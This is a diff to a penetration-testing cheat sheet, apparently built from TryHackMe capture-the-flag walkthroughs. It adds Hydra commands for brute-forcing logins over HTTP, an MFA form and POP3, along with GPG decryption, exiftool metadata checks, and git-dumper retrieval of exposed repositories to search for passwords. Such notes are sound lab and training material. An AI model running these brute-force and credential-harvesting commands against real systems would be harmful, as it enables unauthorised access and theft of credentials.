@@ -106,7 +106,31 @@ This example shows how to brute force a GET request. Check Password Attacks how 
 hydra -l $USERNAME -P dict.lst $VICTIM http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php"
 ```
 
+### Crack on different port&#x20;
 
+#### Examples
+
+[ha-joker-ctf.md](../../walkthroughs/tryhackme/ha-joker-ctf.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt -s 8080 -f $VICTIM http-get /
+```
+
+### **Crafting request with cookie**
+
+This example shows how to brute force a POST request. Check HackPark how to get the request from Burp.
+
+#### Examples
+
+[biteme.md](../../walkthroughs/tryhackme/biteme.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P output.txt $VICTIM http-post-form "/console/mfa.php:code=^PASS^:H=Cookie: PHPSESSID=hshqcs3n42r9qjs5b2850r9alt; user=jason_test_account; pwd=violet:F=Incorrect code" -T 64
+```
 
 ## **SSH**
 
@@ -126,7 +150,7 @@ hydra -l $USERNAME -P /usr/share/wordlists/SecLists/Passwords/darkweb2017-top100
 
 #### Examples
 
-[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[brute-it.md](../../walkthroughs/tryhackme/brute-it.md "mention")[gamingserver.md](../../walkthroughs/tryhackme/gamingserver.md "mention")[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")
+[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[brute-it.md](../../walkthroughs/tryhackme/brute-it.md "mention")[gamingserver.md](../../walkthroughs/tryhackme/gamingserver.md "mention")[mustacchio.md](../../walkthroughs/tryhackme/mustacchio.md "mention")[overpass.md](../../walkthroughs/tryhackme/overpass.md "mention")[0day.md](../../walkthroughs/tryhackme/0day.md "mention")[annie.md](../../walkthroughs/tryhackme/annie.md "mention")[vulnnet.md](../../walkthroughs/tryhackme/vulnnet.md "mention")
 
 **Kali**
 
@@ -179,7 +203,7 @@ hydra -L usernames.txt -P passwords.txt smtp://$VICTIM -v
 
 ## POP3
 
-### Crack username and passwords
+### Crack usernames and passwords
 
 #### Examples
 
@@ -191,15 +215,25 @@ hydra -L usernames.txt -P passwords.txt smtp://$VICTIM -v
 hydra -L usernames.txt -P passwords.txt -f $VICTIM pop3 -V
 ```
 
+### Crack password
+
+#### Examples
+
+[goldeneye.md](../../walkthroughs/tryhackme/goldeneye.md "mention")
+
+**Kali**
+
+```
+hydra -l $USERNAME -P /usr/share/wordlists/fasttrack.txt pop3://$VICTIM:55007
+```
+
 ## Files
-
-
 
 ### Protected Zip Files
 
 #### Examples
 
-[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[agent-sudo.md](../../walkthroughs/tryhackme/agent-sudo.md "mention")[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")
+[john-the-ripper.md](../../walkthroughs/tryhackme/john-the-ripper.md "mention")[agent-sudo.md](../../walkthroughs/tryhackme/agent-sudo.md "mention")[chill-hack.md](../../walkthroughs/tryhackme/chill-hack.md "mention")[ha-joker-ctf.md](../../walkthroughs/tryhackme/ha-joker-ctf.md "mention")
 
 **Kali**
 
@@ -245,6 +279,19 @@ Password: $PASSWORD - one in screenshot above
 
 <figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>
 
+#### Examples
+
+[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")
+
+**Kali**
+
+```
+gpg --output doc --decrypt $FILE.gpg
+Password: $PASSWORD
+```
+
+
+
 ### KeePass&#x20;
 
 **Examples**
@@ -275,7 +322,7 @@ Used to get hidden messages/files from a image. Requires a password.&#x20;
 
 #### Examples
 
-[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")[tokyo-ghoul.md](../../walkthroughs/tryhackme/tokyo-ghoul.md "mention")[blog.md](../../walkthroughs/tryhackme/blog.md "mention")
+[jack-of-all-trades.md](../../walkthroughs/tryhackme/jack-of-all-trades.md "mention")[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")[tokyo-ghoul.md](../../walkthroughs/tryhackme/tokyo-ghoul.md "mention")[blog.md](../../walkthroughs/tryhackme/blog.md "mention")[linux-agency.md](../../walkthroughs/tryhackme/linux-agency.md "mention")
 
 **Kali**
 
@@ -285,6 +332,20 @@ Password: $PASSWORD
 ```
 
 <figure><img src="../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
+
+#### **exiftool**
+
+There may be useful details in the metadata.
+
+#### Examples
+
+[biohazard.md](../../walkthroughs/tryhackme/biohazard.md "mention")[goldeneye.md](../../walkthroughs/tryhackme/goldeneye.md "mention")
+
+**Kali**
+
+```
+exiftool $IMAGE.jpg 
+```
 
 #### binwalk
 
@@ -338,6 +399,28 @@ May be able to find important info from a bin file.
 ```
 strings $binFile > out.txt
 ```
+
+### Git
+
+May be able to find credentials in a project.
+
+#### Examples
+
+[spring.md](../../walkthroughs/tryhackme/spring.md "mention")
+
+**Kali**
+
+```
+pip install git-dumper
+mkdir git
+git-dumper https://$GITPROJECT/.git/ git/
+cd git
+git log
+
+grep -r pass *
+```
+
+
 
 ## Linux Credentials
 
